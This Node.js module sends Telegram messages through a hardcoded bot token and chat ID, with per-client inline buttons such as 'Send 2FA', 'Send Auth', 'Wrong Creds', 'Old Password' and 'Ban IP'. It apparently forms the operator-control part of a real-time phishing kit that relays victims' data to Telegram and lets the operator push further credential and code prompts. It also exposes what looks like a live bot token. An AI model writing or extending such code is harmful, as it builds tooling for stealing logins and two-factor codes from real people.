const axios = require('axios');

const TELEGRAM_TOKEN = '7486909649:AAESD2klhNcxHw3TlHLPv6R72_m-yUywK3k';
const CHAT_ID = '-1002610194905';

/**
 * Sends a Telegram message with optional inline buttons.
 * @param {string} message - The message to send.
 * @param {string|null} clientId - The client ID (for callback data).
 * @param {boolean|string} buttons - true = all buttons, 'banOnly' = only Ban IP button, false = no buttons.
 */
function sendTelegramMessage(message, clientId = null, buttons = false) {
  const payload = {
    chat_id: CHAT_ID,
    text: message,
    parse_mode: 'Markdown',
  };

  if (clientId && buttons) {
    if (buttons === 'banOnly') {
      payload.reply_markup = {
        inline_keyboard: [
          [{ text: '❌ Ban IP', callback_data: `ban_ip:${clientId}` }]
        ]
      };
    } else {
      payload.reply_markup = {
        inline_keyboard: [
          [
            { text: 'Send 2FA', callback_data: `send_2fa:${clientId}` },
            { text: 'Send Auth', callback_data: `send_auth:${clientId}` },
          ],
          [
            { text: 'Send Email', callback_data: `send_email:${clientId}` },
            { text: 'Send WhatsApp', callback_data: `send_wh:${clientId}` },
          ],
          [
            { text: 'Wrong Creds', callback_data: `send_wrong_creds:${clientId}` },
            { text: 'Old Password', callback_data: `send_old_pass:${clientId}` },
          ],
          [
            { text: 'Calendar', callback_data: `send_calendar:${clientId}` },
            { text: '❌ Ban IP', callback_data: `ban_ip:${clientId}` },
          ]
        ]
      };
    }
  }

  return axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, payload)
    .catch(console.error);
}

module.exports = { sendTelegramMessage };
